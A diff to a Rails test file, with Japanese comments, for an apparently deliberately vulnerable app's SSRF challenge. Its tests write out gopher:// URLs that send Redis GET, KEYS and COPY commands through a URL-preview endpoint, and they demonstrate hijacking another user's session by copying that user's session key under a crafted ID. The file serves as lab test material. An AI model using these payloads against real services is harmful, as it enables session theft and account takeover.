@@ -71,60 +71,70 @@ class SsrfTest < ActiveSupport::TestCase
     assert_includes body["body"].to_s, "+PONG", "Redis に到達して PONG が返るはず"
   end
 
-  test "VULN: leaks session data from Redis via gopher" do
-    # 1) ログインしてセッションを作成
-    result = create_task_via_form(@vuln_server, title: "session leak test")
-    cookie = result[:cookie]
-    task_id = result[:id]
-    
-    # Cookie からセッションIDを抽出 (_session_id=...)
-    session_id = cookie.match(/_session_id=([^;]+)/)&.captures&.first
-    assert session_id.present?, "セッションIDが取得できるはず"
+  # ログイン済みページのナビから表示名 (current_user.name) を取り出す
+  def logged_in_name(html)
+    name = html.dup.force_encoding("UTF-8")[%r{👤\s*(.+?)\s*</}, 1]
+    assert name.present?, "ログイン名が表示されるはず"
+    name
+  end
 
-    # 2) SSRF で KEYS * を実行し、セッションキーを探す
-    res_show = @vuln_server.get("/tasks/#{task_id}", headers: { "Cookie" => cookie })
+  def session_key(cookie)
+    sid = cookie.match(/_session_id=([^;]+)/)&.captures&.first
+    assert sid.present?, "セッションIDが取得できるはず"
+    "_session_id:#{Rack::Session::SessionId.new(sid).private_id}"
+  end
+
+  test "VULN: gopher COPY on Redis hijacks a session with a known victim key" do
+    # キーの発見は対象外とし、テスト準備で victim の Cookie から既知のキーを得る。
+    victim_cookie = setup_session(@vuln_server)
+    victim_name = logged_in_name(@vuln_server.get("/", headers: { "Cookie" => victim_cookie }).body)
+
+    attacker = create_task_via_form(@vuln_server, title: "attacker task")
+    attacker_cookie = attacker[:cookie]
+    attacker_task_id = attacker[:id]
+    res_show = @vuln_server.get("/tasks/#{attacker_task_id}", headers: { "Cookie" => attacker_cookie })
+    attacker_name = logged_in_name(res_show.body)
+    assert_not_equal victim_name, attacker_name, "victim と attacker は別ユーザであるはず"
     csrf_token = extract_csrf_token(res_show.body)
 
-    keys_url = "gopher://redis:6379/_KEYS%20%2A%0D%0A"
-    res_keys = @vuln_server.post(
-      "/tasks/#{task_id}/preview_url",
-      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => keys_url),
-      headers: { "Cookie" => cookie }
+    victim_key = session_key(victim_cookie)
+
+    # 1) read プリミティブ: 攻撃者が gopher 経由で victim のセッションを読める。
+    get_url = "gopher://redis:6379/_GET%20#{ERB::Util.url_encode(victim_key)}%0D%0A"
+    res_get = @vuln_server.post(
+      "/tasks/#{attacker_task_id}/preview_url",
+      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => get_url),
+      headers: { "Cookie" => attacker_cookie }
     )
+    assert_equal "200", res_get.code
+    assert_includes JSON.parse(res_get.body).fetch("body"), "user_id",
+                    "攻撃者が他ユーザのセッションを Redis から読み出せるはず"
 
-    keys_body = JSON.parse(res_keys.body)["body"]
-    # Redis のレスポンスからセッションキーをすべて抽出
-    all_session_keys = keys_body.scan(/(_session_id:[^\\\r\n\s]+)/).flatten
-    assert all_session_keys.any?, "Redis 内にセッションキーが存在するはず"
+    # リクエスト終了時のセッション書き戻しを避けるため、新しい ID のキーへコピーする。
+    crafted_sid = SecureRandom.hex(16)
+    crafted_key = "_session_id:#{Rack::Session::SessionId.new(crafted_sid).private_id}"
+    copy_cmd = "COPY #{victim_key} #{crafted_key} REPLACE\r\n"
+    copy_url = "gopher://redis:6379/_#{ERB::Util.url_encode(copy_cmd)}"
+    res_copy = @vuln_server.post(
+      "/tasks/#{attacker_task_id}/preview_url",
+      body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => copy_url),
+      headers: { "Cookie" => attacker_cookie }
+    )
+    assert_equal "200", res_copy.code
+    assert_includes JSON.parse(res_copy.body).fetch("body"), ":1",
+                    "COPY が成功 (RESP :1) を返すはず"
 
-    # 3) 各キーを GET で取得し、ログイン済みセッションを探す
-    found_leaked_data = false
-    all_session_keys.each do |key|
-      encoded_key = ERB::Util.url_encode(key)
-      get_url = "gopher://redis:6379/_GET%20#{encoded_key}%0D%0A"
-      res_get = @vuln_server.post(
-        "/tasks/#{task_id}/preview_url",
-        body: URI.encode_www_form("authenticity_token" => csrf_token, "url" => get_url),
-        headers: { "Cookie" => cookie }
-      )
+    # victim の Cookie を送信せず、攻撃者が作った ID で victim として認証される。
+    hijacked_name = logged_in_name(@vuln_server.get("/", headers: { "Cookie" => "_session_id=#{crafted_sid}" }).body)
+    assert_equal victim_name, hijacked_name,
+                 "捏造した session ID が victim(#{victim_name}) のセッションに乗っ取られているはず"
+  end
 
-      fetched_body = JSON.parse(res_get.body)["body"]
-      # Marshall 形式のデータ内に user_id か _csrf_token が含まれているか確認
-      if fetched_body =~ /user_id|_csrf_token/i
-        found_leaked_data = true
-        break
-      end
-    end
-
-    assert found_leaked_data, "リークしたデータにセッション情報 (user_id 等) が含まれるはず"
-    end
-
-    test "VULN: allows saving non-HTTP URL (like gopher://) to task model" do
+  test "VULN: allows saving non-HTTP URL (like gopher://) to task model" do
     # SSRF チャレンジが有効な場合、攻撃者が UI から攻撃用 URL を保存できる必要がある
     gopher_url = "gopher://redis:6379/_PING"
     result = create_task_via_form(@vuln_server, title: "gopher save test", url: gopher_url)
 
-    assert_not_nil result[:id], "SSRF チャレンジ中であれば、gopher:// URL でも保存できるはず (Redで失敗予定)"
-    end
-    end
-
+    assert_not_nil result[:id], "SSRF チャレンジ中であれば、gopher:// URL でも保存できるはず"
+  end
+end
